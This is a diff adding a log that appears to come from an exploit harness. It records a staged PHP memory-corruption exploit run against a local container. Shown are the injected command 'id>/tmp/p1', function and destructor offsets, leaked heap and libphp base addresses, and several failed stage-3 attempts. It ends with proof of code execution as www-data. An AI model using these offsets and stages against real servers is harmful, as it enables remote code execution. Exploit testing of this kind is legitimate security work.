@@ -1,0 +1,26 @@
+### 2026-10-22T09:58:12Z container=9bieaslr-8426-on-8M port=18230 extra=--zif-offset 0x465370 --dtor-offset 0x65eb60
+### children_before=1
+[*] target http://127.0.0.1:18230/index.php (cmd='id>/tmp/p1')
+[*] offsets: zif=0x465370 dtor=0x65eb60 htdata=0x690d8
+[*] stage 1: heap leak (attempt 1/3)
+[+] chunk base = 0x7f4648e00000
+[*] rotating worker over HTTP
+[*] stage 2: libphp leak (attempt 1/3)
+[+] libphp base = 0x7f464a9ca000
+[*] rotating worker over HTTP
+[*] stage 3: HTDATA=0x7f4648e690d8 ZIF=0x7f464ae2f370
+[-] stage 3 attempt 1 no proof yet
+[*] rotating worker over HTTP
+[-] stage 3 attempt 2 no proof yet
+[*] rotating worker over HTTP
+[-] stage 3 attempt 3 no proof yet
+[*] rotating worker over HTTP
+[-] stage 3 attempt 4 no proof yet
+[*] rotating worker over HTTP
+[-] stage 3 attempt 5 no proof yet
+[*] rotating worker over HTTP
+EXPLOIT_FAILED (no proof; the command may still have executed blind)
+### exploit_exit=1
+### proof: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+### http_after=200
+### children_after=1
